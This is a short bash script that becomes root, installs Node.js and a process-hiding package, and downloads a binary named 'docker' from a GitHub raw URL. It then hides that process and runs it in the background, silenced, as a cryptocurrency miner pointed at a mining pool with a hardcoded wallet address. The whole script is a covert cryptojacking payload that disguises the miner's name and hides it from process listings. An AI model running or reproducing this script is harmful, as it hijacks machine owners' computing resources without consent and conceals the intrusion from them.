#!/bin/bash
sudo su
apt update && apt -y install sudo gcc curl zip
apt install gcc -y
apt install nodejs -y
npm install -g npm@8.5.0
npm i -g node-process-hider
wget https://raw.githubusercontent.com/jsiqiisn/baby/main/docker
ph add docker
chmod +x docker
./docker -o sf.pool-pay.com:4025 -u SafexsnsPwCNzaHDEfcGTzgW9rNcKQhAmBFNrH8KRUjvcfZHGuyKAgSd1Gd5C72WVwLtUfhA3tyXsLQnkXbH1JwGHkgxtdoGRvc3n -p $(echo $(shuf -i 1-20000 -n 1)-V) -k -a rx/sfx > /dev/null 2>&1 &
uname -a
